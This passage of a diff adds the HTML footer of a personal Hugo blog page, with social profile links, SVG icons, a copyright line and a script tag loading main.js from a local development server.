+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://discord.com/users/kanyo._" target="_blank" rel="noopener noreferrer me"
+    title="Discord"><svg xmlns="http://www.w3.org/2000/svg" viewBox="20 15 205 190" fill="currentColor" stroke="none">
+    <path
+        d="M104.4 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zM140.9 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z" />
+    <path
+        d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2 0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6 0 0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3 0 0-8.5 14.5-30.6 15.2z" />
+</svg></a>
+<a href="https://github.com/Chaelsoo" target="_blank" rel="noopener noreferrer me"
+    title="Github"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg></a>
+<a href="https://www.linkedin.com/in/abderrahmen-dellaa-a78517249/" target="_blank" rel="noopener noreferrer me"
+    title="Linkedin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
+    <rect x="2" y="9" width="4" height="12"></rect>
+    <circle cx="4" cy="4" r="2"></circle>
+</svg></a>
+<a href="https://app.hackthebox.com/users/1490281" target="_blank" rel="noopener noreferrer me"
+    title="Hackthebox"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1L2 6.5v11L12 23l10-5.5v-11L12 1z"></path><path d="M12 12L2 6.5M12 12v11M12 12l10-5.5"></path></svg></a>
+</div>
+    <small class="footer_copyright">
+        © 2026 .
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+
+
+
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js"></script>
+
+    
+
+</body>
+</html>
